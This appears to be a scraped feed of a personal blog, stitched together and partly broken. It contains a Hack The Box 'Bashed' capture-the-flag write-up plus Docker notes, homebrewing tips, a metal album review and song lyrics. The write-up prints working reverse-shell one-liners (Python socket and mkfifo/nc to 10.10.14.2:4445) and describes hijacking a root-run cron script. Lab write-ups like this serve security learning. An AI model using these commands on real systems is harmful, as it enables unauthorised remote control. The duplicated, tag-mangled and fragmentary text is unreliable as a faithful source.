&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;This was a box that mainly involved scanning the web server for interesting items and then gaining foothold via a php webshell called phpbash.  Privilege escalation was a good exercise in not overcomplicating python code.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Started with the usual nmap scan of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -T4 -A -v 10.10.10.68&lt;/code&gt;.  Only thing found was a webserver so I looked at the webserver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Bashed/Bashed-website.png&quot; alt=&quot;phpbash webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt; as I have used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; before but not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt; so it ws a chance to get familiar with the tool. It seems to have its default wordlisting for directories and that worked here.&lt;/p&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The noticable thing here that leads to something is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev&lt;/code&gt;.  Browsing to it shows us that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpbash&lt;/code&gt; is indeed available for use.  So browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.68/dev/phpbash.php&lt;/code&gt; gave me a webshell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Bashed/phpbash-webshell.png&quot; alt=&quot;phpbash&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;I had issues trying to figure out how to use phpbash to get a reverse shell.  The usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; command wasn’t working, and the usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt; one-liner workaround didn’t work inside the webshell.  Also noticed perl and a few others weren’t available as well.  For me only a python reverse shell one-liner worked:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;port&amp;gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After getting a shell, I upgraded it with the standard python command:&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Immediately after doing this I was getting an echo of each character
&lt;em&gt;lliikkee tthhiiss&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So I did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTRL+Z&lt;/code&gt; to the background and ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt; followed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fg&lt;/code&gt; to get my shell back, and the echo was gone.&lt;/p&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;p&gt;I immediately went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; and noticed that arrexel’s user folder had world readable permissions on the user.txt file. I was able to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; it easily as the www-data user.&lt;/p&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;

&lt;p&gt;Looking around the filesystem (and a peek at the official HTB walkthrough cause honestly, I have to be effective with my time at this point in my life) we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/scripts&lt;/code&gt; root directory is owned by the &lt;em&gt;scriptmanager&lt;/em&gt; user.&lt;/p&gt;

&lt;p&gt;Checking out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; options we see that we can run anything as this &lt;em&gt;scriptmanager&lt;/em&gt; user so I grab a shell as the user via this command:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u scriptmanager /bin/bash&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Moving into the interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/scripts&lt;/code&gt; directory we see a couple files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file seems to update its timestamp every minute or so and is owned by &lt;em&gt;root&lt;/em&gt;.  Looking at the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; we can see why - it is simply putting text into the txt file when it executes.  &lt;em&gt;root&lt;/em&gt; must be executing it since it is the owner of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Now that I had write access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; file, I just needed to write some python code to give me a reverse shell.  I did some Googling and discovered this is as easy as just using native python os lib.&lt;/p&gt;

&lt;p&gt;Since the native &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; binary didn’t support &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt;.  I just went with the bash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt; one-liner that works when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -e&lt;/code&gt; isn’t available.&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; I added the code via an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import os; os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.2 4445 &amp;gt;/tmp/f')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I had my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp 4445&lt;/code&gt; listener up and it received a shell.  Got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; without issue.&lt;/p&gt;

&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;

&lt;p&gt;Overall a pretty fun and straightforward box.  My first writeup as a means of keeping notes.  If it is helpful to others, that is great!&lt;/p&gt;

&lt;p&gt;In the future, I’m hoping to get better with screenshots etc. or learning how to capture the commands and output in gifs.  We will see.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.docker.com/get-started/&quot;&gt;Get Started&lt;/a&gt;&lt;br /&gt;
I spent a couple days going over the basics of Docker.. just wanted to summarize what I’ve learned.  I should probably just invest my time in EverNote instead of typing up these markdown pages.  But honestly, challenge accepted.&lt;/p&gt;

&lt;h2 id=&quot;terms&quot;&gt;Terms&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Image&lt;/strong&gt; - A read-only package that is housed within a container&lt;br /&gt;
&lt;strong&gt;Container&lt;/strong&gt; - This is a runtime of images defined by a &lt;em&gt;Dockerfile&lt;/em&gt;. I don’t know what all goes in this yet but it seems to define what directories exist and what ports to open up from the container to the host.  More TBD.&lt;br /&gt;
&lt;strong&gt;Service&lt;/strong&gt; - Scaling and load balancing.  This is where you define what service a container will function as (ie. web) and define parameters like how many container replicas.&lt;br /&gt;
&lt;strong&gt;Replica&lt;/strong&gt; - Basically a container instance on a single host machine running docker engine.&lt;br /&gt;
&lt;strong&gt;Swarm&lt;/strong&gt; - When you begin clustering multiple docker hosts (with their own docker engines running) then these are called swarms.  Apps can quickly be deployed to swarms configured to talk to each other. &lt;br /&gt;
&lt;strong&gt;Node&lt;/strong&gt; - A single docker host in a swarm.&lt;br /&gt;
&lt;strong&gt;Stack&lt;/strong&gt; - The docker compose basically defines this.  It can consist of different services that deploy containers (ie. web, db, etc.)&lt;/p&gt;

&lt;p&gt;Note to self - learn YAML.&lt;/p&gt;

&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;
&lt;h3 id=&quot;general&quot;&gt;General&lt;/h3&gt;

I should probably just invest my time in EverNote instead of typing up these markdown pages. But honestly, challenge accepted. Terms Image - A read-only package that is housed within a container Container - This is a runtime of images defined by a Dockerfile. I don’t know what all goes in this yet but it seems to define what directories exist and what ports to open up from the container to the host. More TBD. Service - Scaling and load balancing. This is where you define what service a container will function as (ie. web) and define parameters like how many container replicas. Replica - Basically a container instance on a single host machine running docker engine. Swarm - When you begin clustering multiple docker hosts (with their own docker engines running) then these are called swarms. Apps can quickly be deployed to swarms configured to talk to each other. Node - A single docker host in a swarm. Stack - The docker compose basically defines this. It can consist of different services that deploy containers (ie. web, db, etc.) Note to self - learn YAML. Commands General docker container ls - list containers on a host docker service ls - list services on a host docker service ps &amp;lt;service&amp;gt; - show tasks spawned by a service (services run tasks, tasks then spawn containers) Swarm Manager docker node ls - list nodes in a swarm (swarm manager command) docker stack deploy -c &amp;lt;yaml file&amp;gt; &amp;lt;name&amp;gt; - Deploy an app to a swarm docker stack rm &amp;lt;name&amp;gt; - Undeploy an app from a swarm docker swarm init - initialize a swarm manager docker swarm join --token &amp;lt;blah&amp;gt; ... - look for this command when performing a swarm init to join nodes to the swarm docker swarm leave (--force) - have a node leave a swarm Other observations Docker machine Used for managing docker engine node machines Controls local virtual machines and can utilize virtualbox/hyperv/etc. Seems like local virtual machines with multiple docker container could potentially be a good localized development environment?

&lt;p&gt;Just wanted to hold a moment of silence in this post for my 2011 Macbook Pro that officially died this morning. /sadface&lt;/p&gt;

&lt;p&gt;After a lot of troubleshooting I narrowed it down to the keyboard’s power button and ended up &lt;a href=&quot;https://www.ifixit.com/Guide/MacBook+Pro+17-Inch+Unibody+Upper+Case+Replacement/3439&quot;&gt;ripping it all open&lt;/a&gt; and &lt;a href=&quot;http://www.insidemylaptop.com/how-to-replace-keyboard-on-macbook-pro-13-15-17-laptops/&quot;&gt;replacing the keyboard&lt;/a&gt;.  The power button did work after that and I felt a moment of accomplishment.  It continued to work up until I had to plug in the power cord to charge it.  Overnight it charged while in “hibernation” due to being idle.  Next day - nothing from the power button.  Going through all the troubleshooting - no dice.  Therefore, I’m going to conclude that there was a short going on somewhere that bricked the board when I hooked up the power and I’m moving on.  I’ve still got my Samsung ultrabook to keep me company.&lt;/p&gt;

&lt;p&gt;Well - onto the brewing notes! I recently attended a brewing 101 session.  I brewed for maybe 2 years off and on but never really tried to greatly improve. This time will hopefully be different.  Key notes from the session below.&lt;/p&gt;

&lt;h1 id=&quot;brew-101-notes&quot;&gt;Brew 101 Notes&lt;/h1&gt;
&lt;h2 id=&quot;general&quot;&gt;General&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Mark 5 gallons on fermenter for ease of use&lt;/li&gt;
  &lt;li&gt;Do not use distilled water - no minerals&lt;/li&gt;
  &lt;li&gt;Even temperatures during fermentation help yeast prevent off flavors&lt;/li&gt;
  &lt;li&gt;Certain kinds of beer - higher fermentation temps help flavor (ie. bavarian hefeweizen and banana clove flavor)&lt;/li&gt;
  &lt;li&gt;Think about a bag over a fermenter in case of eruption&lt;/li&gt;
  &lt;li&gt;Avoid aluminum pots because they heat too quickly&lt;/li&gt;
  &lt;li&gt;Don’t add nuts or anything with high fat to beer&lt;/li&gt;
  &lt;li&gt;White Vinegar can clean a copper wort chiller&lt;/li&gt;
  &lt;li&gt;OG - if lower than expected - expect to drink beer faster.  If above, can dilute the wort before fermentation with extra water.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;

      &lt;th style=&quot;text-align: center&quot;&gt;Type&lt;/th&gt;

      &lt;td style=&quot;text-align: center&quot;&gt;——&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;procedure&quot;&gt;Procedure&lt;/h2&gt;
&lt;h3 id=&quot;prep&quot;&gt;Prep&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Everything should be “Visibility” clean&lt;/li&gt;
  &lt;li&gt;Cleanliness is the most important thing to brewing good beer&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;CLEAN&lt;/em&gt; - PBW is your friend&lt;br /&gt;
  ** Fermenter - 30 min soak&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;SANITIZE&lt;/em&gt; - StarSan is your friend&lt;br /&gt;
  ** Fermenter - 30 second shake&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;brew-day&quot;&gt;Brew day&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Only use cold water&lt;/li&gt;
  &lt;li&gt;Grains into water before bringing to boil - 170 degrees max / ~20 minutes&lt;/li&gt;
  &lt;li&gt;Cut heat when adding extract or malt&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Don’t&lt;/em&gt; squeeze the grains when removing from the kettle, just let it drip&lt;/li&gt;
  &lt;li&gt;No need to stir hops&lt;/li&gt;
  &lt;li&gt;Avoid boil over by removing heat, don’t blow on foam&lt;/li&gt;
  &lt;li&gt;Do not put a lid on the boil, causes off flavors&lt;/li&gt;
  &lt;li&gt;Clarifiers are awesome, but not for all beers (ie. hefeweizen)&lt;/li&gt;
  &lt;li&gt;Wort chiller could be added into boil near the end (5min) to sanitize, but better idea to just sanitize in solution&lt;/li&gt;
  &lt;li&gt;Add &lt;em&gt;chilled&lt;/em&gt; water to wort after boil to bring to fermenter.  Fill to 5.25-5.5 gallons.&lt;/li&gt;
  &lt;li&gt;Be sure to stir wort prior to OG reading after adding chilled water. Taste it and remember it for comparison post-fermination.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;fermenting&quot;&gt;Fermenting&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;The sooner the fermentation begins the better.  Hopefully 12-24 hours.&lt;/li&gt;
  &lt;li&gt;If nothing happens after 36+ hours - pitch new yeast&lt;/li&gt;
  &lt;li&gt;If there isn’t much action, check temp of the fermenter.  Should be in the mid-high end for the yeast strain ideally.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;secondary&quot;&gt;Secondary&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;After OG remains consistent for 2-3 days in a row, transfer.&lt;/li&gt;
  &lt;li&gt;Secondary is absolutely necessary for beers with OG &amp;gt; 1.05&lt;/li&gt;
  &lt;li&gt;Used to smooth out taste or add other flavors (like a dry hop)&lt;/li&gt;
  &lt;li&gt;Try not to disturb the cake of the primary fermenter when transferring&lt;/li&gt;
  &lt;li&gt;Dry hopping - can be done at any time during the secondary timeframe (~2 weeks)&lt;/li&gt;
  &lt;li&gt;OG measurement - taste should be approx 75% less sweet than the original OG measurement (wort)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;bottling&quot;&gt;Bottling&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Use corn sugar, it’s the best for bottle conditioning&lt;/li&gt;
  &lt;li&gt;Dried malt extract (DME) could be used for more bubbles, but takes longer to condition (3+ weeks)&lt;/li&gt;
  &lt;li&gt;Stir the boiled sugar into bottling bucket for thorough mixture, gently.&lt;/li&gt;
  &lt;li&gt;Turn the bottle to its side after capping to ensure proper seal&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;amount-of-corn-sugar-per-5gal-batch&quot;&gt;Amount of corn sugar per 5gal batch&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;4.5 oz - Bar type carbonation&lt;/li&gt;
  &lt;li&gt;4 oz - better for English beers&lt;/li&gt;
  &lt;li&gt;4.75 oz - Belgians&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enjoyment&quot;&gt;Enjoyment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2-3 weeks to condition, max 3&lt;/li&gt;
  &lt;li&gt;If OG 1.030 –&amp;gt; Drink within 2 months&lt;/li&gt;
  &lt;li&gt;If OG is higher –&amp;gt; Drink within 6 months&lt;/li&gt;

&lt;p&gt;Maybe this weekend!&lt;/p&gt;

&lt;p&gt;I just had to post something quick about a new band I found named Junius.&lt;br /&gt;
I subscribe to &lt;a href=&quot;https://www.decibelmagazine.com&quot;&gt;Decibel&lt;/a&gt;, which I recommend for anyone who has moved beyond the glory days that consisted
of massive amounts of free time and very little responsibility.  Those days are behind me now for sure, and Decibel is my go-to for keeping up with the metal scene 
other than a key friend who is still living his glory days.&lt;/p&gt;

&lt;p&gt;Decibel had a review for the new Junius album &lt;em&gt;Eternal Rituals for the Accretion of Light&lt;/em&gt;.  I believe they gave it a 8 or 9 out of 10. The album is so damn good and 
it’s basically been on repeat for me the last month or so.  Highly recommend you click &lt;a href=&quot;https://www.youtube.com/watch?v=tv_yKPChhq4&quot;&gt;here&lt;/a&gt; and check out the song &lt;em&gt;Mass for Metaphysicians&lt;/em&gt;. 
The theme throughout the album regarding the path to transcendence only adds to the enjoyment of the music itself.  I think this will be one of my top 2017 albums for sure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://f4.bcbits.com/img/a1160145689_16.jpg&quot; alt=&quot;img&quot; title=&quot;Eternal Rituals&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a stab at the lyrics to &lt;a href=&quot;https://www.youtube.com/watch?v=gpSsLb59B1o&quot;&gt;&lt;em&gt;Black Sarcophagus&lt;/em&gt;&lt;/a&gt; below which ends the album (probably my favorite track) and speaks to the existentialism tone throughout the album.&lt;/p&gt;

&lt;p&gt;The lyrical content makes me think of Fear Factory or Meshuggah’s brand of constantly improving thyself.  Where as Fear Factory and Meshuggah go the route of a more cyborg-like reconstruction to the self in order to improve, Junius speaks more to spiriual transcendence by stepping beyond the physical realm.&lt;/p&gt;

Light the fire
Burning clothes
The energy starts to flow

I am what I've learned
I meditate
My body shakes
The room starts to glow

Pouring over me
Higher frequencies
The final hour of the pain I'll devour

The bearer of light
The primal tones
Take my flesh and let me go

The final march
The seventh step
The death of this dream has come

All I have loved
All I have held
Has led to this sea of one

All I have loved
All I have held
Has led to this song of souls

Send me up now
Send me up now
Send me up now
I'm ready for time to die
I'm ready for infinite eyes

Seal the room Light the fire Burning clothes The energy starts to flow I am what I've learned I meditate My body shakes The room starts to glow Pouring over me Higher frequencies The final hour of the pain I'll devour The bearer of light The primal tones Take my flesh and let me go The final march The seventh step The death of this dream has come All I have loved All I have held Has led to this sea of one All I have loved All I have held Has led to this song of souls Send me up now Send me up now Send me up now I'm ready for time to die I'm ready for infinite eyes</summary></entry><entry><title type="html">The Genesis</title><link href="http://localhost:4000/personal/music/2017/08/01/the-genesis.html" rel="alternate" type="text/html" title="The Genesis" /><published>2017-08-01T22:00:00-05:00</published><updated>2017-08-01T22:00:00-05:00</updated><id>http://localhost:4000/personal/music/2017/08/01/the-genesis</id><content type="html" xml:base="http://localhost:4000/personal/music/2017/08/01/the-genesis.html">&lt;h2 id=&quot;a-creative-outlet&quot;&gt;A creative outlet&lt;/h2&gt;

&lt;p&gt;I was recently told this by someone I was watching typing away at some code.
I realized I have always been interested in coding but just never really took the time to improve the craft.
I also realized I didn’t really have a creative outlet.&lt;/p&gt;

&lt;p&gt;So here I am this evening, thinking to myself - go start a blog and make it your creative outlet.
Go take notes on that coding you’ve been learning.
Write about that band you’ve been listening to… the latest delicious beer.  So on and so forth.&lt;/p&gt;

&lt;p&gt;The thoughts all culiminated into action recently while listening to this &lt;a href=&quot;http://www.youtube.com/watch?v=A7O6Ozx95P8&quot;&gt;Leprous&lt;/a&gt; live album.  I encourage everyone to have a listen.  It’ll encompass about two hours of your life that you’ll &lt;em&gt;love&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;What will transpire amongst these pages (in between random gaming relapses) is a dedicated stream of conciousness encompassing coding, cyber security, beer, and metal music through a filter of drunken rambling as I work to fight off procrastination.&lt;/p&gt;

&lt;p&gt;So, in the inspirational lyrics of &lt;em&gt;‘Rewind’&lt;/em&gt; (&lt;a href=&quot;http://www.youtube.com/watch?v=A7O6Ozx95P8#t=17m45s&quot;&gt;17:45&lt;/a&gt;
 of the video) by &lt;em&gt;Leprous&lt;/em&gt; - The circle (of procrastination) is ending for me.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Build up, tear down
Set free, rewind
Set free, rewind, rewind!

The circle is ending
I'm done pretending
Left behind

Resist to be reputed
Protect the undisputed
Behold your insufficiency wistfully

Behold your demolition
Assume there's no ambition
None better suited

Build up, tear down
Set free, rewind
Set free, rewind, rewind!

The circle is ending
I'm done pretending
Left behind

I am hollow
None to follow
I am hollow
Rewind, Rewind!

The circle is ending
I'm done pretending
Left behind

The same logical notion
Conceal secret emotion

Behind resting devotion
Steadily in your ocean
In your ocean

Build up, tear down
Set free, rewind
Rewind, rewind!

The circle is ending
I'm done pretending
Left behind

Hopeful undistilled
Intention unfulfilled

Destroyed to justify
To wake up and to die
My quiet ruin

Build up, tear down
Set free, rewind
Rewind, rewind!

The circle is ending
I'm done pretending
Left behind

I am hollow
None to follow
I am hollow
NONE TO FOLLOW

SHATTER, FALL
NEVER FOUND AT ALL
YET SECRETLY TOLD TO REWIND

OVER AND OVER AND OVER AGAIN
THAT'S WHY, EVEN RUINS... DIE&quot;
